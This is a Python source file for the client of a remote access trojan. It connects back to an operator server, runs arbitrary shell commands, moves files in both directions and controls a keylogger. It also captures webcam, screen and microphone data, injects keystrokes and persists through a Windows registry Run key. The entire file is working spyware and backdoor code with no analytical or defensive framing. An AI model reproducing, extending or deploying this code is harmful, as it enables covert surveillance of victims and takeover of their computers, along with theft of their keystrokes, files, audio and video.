import sys
import time
import socket
import json
import subprocess
from subprocess import PIPE
import os
import threading
from Logger import Keylogger
import cv2
import pickle
import struct
import pyautogui
import shutil
import pyaudio
from pynput.keyboard import Key, Controller
from mss import mss
import numpy as np

# Create client socket
sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# ================= CAMERA SNAPSHOT =================
def send_camera_image(server_ip, port=9999):
    # Capture single frame from webcam
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if not ret:
        return

    # Encode image as JPEG
    _, img_encoded = cv2.imencode(".jpg", frame)
    data = img_encoded.tobytes()

    # Send image to server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, port))

    # Send size first, then image data
    client.sendall(struct.pack("!I", len(data)))
    client.sendall(data)

    client.close()

# ================= REMOTE KEY INPUT =================
keyb = Controller()

def acc_keystroke():
    # Receive keystroke commands from server and simulate typing
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('[IP SERVER]', 9995))
        while True:
            data = s.recv(1024)
            if not data:
                break

            command = data.decode()

            try:
                if command.lower() == 'enter':
                    keyb.press(Key.enter)
                    keyb.release(Key.enter)
                elif command.lower() == 'space':
                    keyb.press(Key.space)
                    keyb.release(Key.space)
                else:
                    keyb.type(command)  # Type arbitrary text
            except Exception as e:
                print(f'{e}')
                break

# ================= AUDIO RECORD =================
FORMAT = pyaudio.paInt16
CHANNEL = 1
RATE = 44100
CHUNK = 1024

def record_n_send():
    # Record audio from microphone and send to server
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNEL,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    print('Recording')

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('[IP SERVER]', 9996))

            # Record ~10 seconds
            for _ in range(0, int(RATE / CHUNK * 10)):
                data = stream.read(CHUNK)
                s.sendall(data)

            print('Record done')

    except socket.error as e:
        print(f'{e}')

    finally:
        # Cleanup audio resources
        stream.stop_stream()
        stream.close()
        audio.terminate()

# ================= PERSISTENCE =================
def execute_persistence(nama_registry, file_exe):
    # Copy executable to AppData and add to Windows startup registry
    file_path = os.environ['appdata'] + '\\' + file_exe

    try:
        if not os.path.exists(file_path):
            shutil.copyfile(sys.executable, file_path)

            # Add registry entry for persistence
            subprocess.call(
                'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run '
                '/v ' + nama_registry + ' /t REG_SZ /d "' + file_path + '"',
                shell=True
            )
    except:
        pass

# ================= SCREEN SHARE =================
def send_screen_record(server_ip, port=9991):
    # Send live screen capture frames
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, port))

    sct = mss()
    monitor = sct.monitors[1]

    while True:
        try:
            # Capture screen
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)

            # Serialize frame
            data = pickle.dumps(frame)
            size = struct.pack("Q", len(data))

            # Send frame size + frame data
            client.sendall(size + data)

            # Stop condition (local key press)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        except Exception as e:
            print(f'{e}')
            break

    client.close()
    cv2.destroyAllWindows()

# ================= CAMERA STREAM =================
def byte_stream():
    # Stream webcam frames continuously
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('[IP SERVER]', 9998))

    vid = cv2.VideoCapture(0)

    while vid.isOpened():
        ret, frame = vid.read()
        if not ret:
            break

        # Serialize frame
        b = pickle.dumps(frame)
        message = struct.pack("Q", len(b)) + b

        sock.sendall(message)

def kirim_byte_stream():
    # Run camera streaming in separate thread
    t = threading.Thread(target=byte_stream)
    t.start()

# ================= KEYLOGGER =================
def open_log():
    # Send keylogger log content to server
    sok.send(Keylogger().baca_log().encode())

def log_thread():
    # Run log sending in separate thread
    t = threading.Thread(target=open_log)
    t.start()

# ================= FILE TRANSFER =================
def download_file(namafile):
    # Receive file from server
    bufsize = 65536
    size_data = sok.recv(8)
    filesize = struct.unpack("Q", size_data)[0]

    if filesize == 0:
        return

    recv = 0
    with open(namafile, 'wb') as file:
        while recv < filesize:
                data = sok.recv(bufsize)
                if not data:
                    break
                file.write(data)
                recv += len(data)

def upload_file(namafile):
    # Send file to server
    bufsize = 65536

    if not os.path.exists(namafile):
        sok.sendall(struct.pack("Q", 0))
        return

    filesize = os.path.getsize(namafile)
    sok.sendall(struct.pack("Q", filesize))

    with open(namafile, 'rb') as f:
        while True:
            data = f.read(bufsize)
            if not data:
                break
            sok.sendall(data)

# ================= RECEIVE COMMAND =================
def terima_perintah():
    # Receive JSON command reliably
    data = ''
    while True:
        try:
            data = data + sok.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# ================= COMMAND EXECUTION =================
def jalankan_perintah():
    # Main loop: execute commands received from server
    while True:
        perintah = terima_perintah()

        if perintah in ('exit', 'quit'):
            break

        elif perintah == 'clear':
            pass

        # Change directory
        elif perintah[:3] == 'cd ':
            try:
                os.chdir(perintah[3:])
            except:
                pass

        # File transfer
        elif perintah[:8] == 'download':
            upload_file(perintah[9:])
        elif perintah[:6] == 'upload':
            download_file(perintah[7:])

        # Keylogger controls
        elif perintah == 'start_log':
            Keylogger().start_log()
        elif perintah == 'baca_log':
            log_thread()
        elif perintah == 'clear_log':
            Keylogger().clear_log()
        elif perintah == 'stop_log':
            Keylogger().stop_listener()

        # Camera / screen
        elif perintah == 'start_cam':
            kirim_byte_stream()
        elif perintah == 'screen_shot':
            ss = pyautogui.screenshot()
            ss.save('ss.png')
            upload_file('ss.png')
            os.remove("ss.png")
        elif perintah == 'screen_share':
            send_screen_record(server_ip='[IP SERVER]', port=9991)

        # Persistence
        elif perintah[:11] == 'persistence':
            nama_registry, file_exe = perintah[12:].split(' ')
            execute_persistence(nama_registry, file_exe)

        # Audio recording
        elif perintah == 'rec_audio':
            record_n_send()

        # Remote typing
        elif perintah == 'send_key':
            acc_keystroke()

        # Camera snapshot
        elif perintah == 'snap_cam':
            send_camera_image(server_ip='[IP SERVER]', port=9993)

        # Default: execute system command
        else:
            exe = subprocess.Popen(
                perintah,
                shell=True,
                stdout=PIPE,
                stderr=PIPE,
                stdin=PIPE
            )

            data = exe.stdout.read() + exe.stderr.read()
            data = data.decode()

            # Send result back as JSON
            output = json.dumps(data)
            sok.send(output.encode())

# ================= AUTO RECONNECT =================
def execute_persist():
    # Try to reconnect to server continuously
    while True:
        try:
            time.sleep(10)
            sok.connect(('[IP SERVER]', 9999))
            jalankan_perintah()
            sok.close()
            break
        except:
            # Recursive retry (can cause stack issue)
            execute_persist()

# Start client
execute_persist()
